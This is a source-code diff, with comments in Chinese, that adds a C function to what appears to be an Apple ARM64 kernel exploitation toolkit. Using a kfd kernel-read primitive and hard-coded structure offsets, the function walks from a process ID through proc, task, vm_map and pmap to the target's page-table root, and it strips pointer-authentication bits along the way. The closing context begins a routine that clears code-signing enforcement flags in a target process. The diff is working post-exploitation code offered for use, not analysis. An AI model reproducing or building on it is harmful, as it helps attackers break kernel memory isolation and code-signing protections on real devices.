@@ -1177,6 +1177,168 @@ uint64_t mf_find_proc_by_pid(int pid, char *report, size_t report_len)
     return 0;
 }
 
+/* ================================================================ */
+/* 5b) 跨进程：pid -> 目标 pmap -> 目标页表根（M5.108）                */
+/* ================================================================ */
+
+/* PAC strip（T8112 上 t1sz = 17，与 MFCalibrate 用的同一套规则）。 */
+static uint64_t mf_bridge_unsign(uint64_t p)
+{
+    if (p == 0) {
+        return 0;
+    }
+    uint64_t ptr_mask = (1ULL << (64 - 17)) - 1ULL;
+    uint64_t pac_mask = ~ptr_mask;
+    if (p & (1ULL << 55)) {
+        return p | pac_mask;
+    }
+    return p & ~pac_mask;
+}
+
+static int mf_bridge_is_kaddr(uint64_t a)
+{
+    return a >= 0xffff000000000000ULL;
+}
+
+int mf_pid_chain(int pid, uint64_t *proc_out, uint64_t *task_out, uint64_t *map_out,
+                 uint64_t *pmap_out, uint64_t *root_out, char *report, size_t report_len)
+{
+    uint64_t proc = 0, proc_ro = 0, task = 0, map = 0, pmap = 0;
+    uint64_t root = 0, ttep = 0, ttep_kva = 0;
+    int rc = 0;
+
+    if (g_kfd == NULL) {
+        if (report && report_len) {
+            snprintf(report, report_len, "KFD 未打开");
+        }
+        return -1;
+    }
+
+    proc = mf_find_proc_by_pid(pid, report, report_len);
+    if (proc == 0) {
+        return -2;
+    }
+    if (!mf_bridge_is_kaddr(proc)) {
+        if (report && report_len) {
+            snprintf(report, report_len, "proc=0x%llx 不是内核地址",
+                     (unsigned long long)proc);
+        }
+        return -3;
+    }
+
+    if (mf_kread64(proc + 0x18, &proc_ro) != 0) {
+        rc = -4;
+        if (report && report_len) {
+            snprintf(report, report_len, "读 proc+0x18 (proc_ro) 失败");
+        }
+        goto out;
+    }
+    proc_ro = mf_bridge_unsign(proc_ro);
+    if (!mf_bridge_is_kaddr(proc_ro)) {
+        rc = -4;
+        if (report && report_len) {
+            snprintf(report, report_len, "proc_ro=0x%llx 不是内核地址",
+                     (unsigned long long)proc_ro);
+        }
+        goto out;
+    }
+
+    if (mf_kread64(proc_ro + 0x08, &task) != 0) {
+        rc = -5;
+        if (report && report_len) {
+            snprintf(report, report_len, "读 proc_ro+0x08 (pr_task) 失败");
+        }
+        goto out;
+    }
+    task = mf_bridge_unsign(task);
+    if (!mf_bridge_is_kaddr(task)) {
+        rc = -5;
+        if (report && report_len) {
+            snprintf(report, report_len, "task=0x%llx 不是内核地址",
+                     (unsigned long long)task);
+        }
+        goto out;
+    }
+
+    if (mf_kread64(task + 0x28, &map) != 0) {
+        rc = -6;
+        if (report && report_len) {
+            snprintf(report, report_len, "读 task+0x28 (vm_map) 失败");
+        }
+        goto out;
+    }
+    map = mf_bridge_unsign(map);
+    if (!mf_bridge_is_kaddr(map)) {
+        rc = -6;
+        if (report && report_len) {
+            snprintf(report, report_len, "vm_map=0x%llx 不是内核地址",
+                     (unsigned long long)map);
+        }
+        goto out;
+    }
+
+    if (mf_kread64(map + 0x40, &pmap) != 0) {
+        rc = -7;
+        if (report && report_len) {
+            snprintf(report, report_len, "读 vm_map+0x40 (pmap) 失败");
+        }
+        goto out;
+    }
+    pmap = mf_bridge_unsign(pmap);
+    if (!mf_bridge_is_kaddr(pmap)) {
+        rc = -7;
+        if (report && report_len) {
+            snprintf(report, report_len, "pmap=0x%llx 不是内核地址",
+                     (unsigned long long)pmap);
+        }
+        goto out;
+    }
+
+    /* pmap->tte / pmap->ttep（struct pmap 前两个字段） */
+    if (mf_kread64(pmap, &root) != 0 || mf_kread64(pmap + 0x08, &ttep) != 0) {
+        rc = -8;
+        if (report && report_len) {
+            snprintf(report, report_len, "读 pmap->tte/ttep 失败");
+        }
+        goto out;
+    }
+    root = mf_bridge_unsign(root);
+    ttep = ttep & 0x0000fffffffff000ULL;
+    ttep_kva = mf_phys_to_kv(ttep);
+
+    /*
+     * 自证：任何 pmap 都满足 phystokv(ttep) == tte。
+     * 这一条错了说明中间某一跳读到了别的东西，宁可不读也不继续往下走。
+     */
+    if (root == 0 || !mf_bridge_is_kaddr(root) || ttep_kva != root) {
+        rc = -8;
+        if (report && report_len) {
+            snprintf(report, report_len,
+                     "pmap 自证失败：tte=0x%llx ttep=0x%llx phystokv(ttep)=0x%llx",
+                     (unsigned long long)root, (unsigned long long)ttep,
+                     (unsigned long long)ttep_kva);
+        }
+        goto out;
+    }
+
+    if (proc_out) *proc_out = proc;
+    if (task_out) *task_out = task;
+    if (map_out)  *map_out = map;
+    if (pmap_out) *pmap_out = pmap;
+    if (root_out) *root_out = root;
+    if (report && report_len) {
+        snprintf(report, report_len,
+                 "pid=%d proc=0x%llx proc_ro=0x%llx task=0x%llx map=0x%llx pmap=0x%llx root=0x%llx",
+                 pid, (unsigned long long)proc, (unsigned long long)proc_ro,
+                 (unsigned long long)task, (unsigned long long)map,
+                 (unsigned long long)pmap, (unsigned long long)root);
+    }
+    return 0;
+
+out:
+    return rc;
+}
+
 /*
  * 在目标 proc 里找 p_csflags 并清掉 CS_HARD / CS_RESTRICT / CS_REQUIRE_LV。
  *
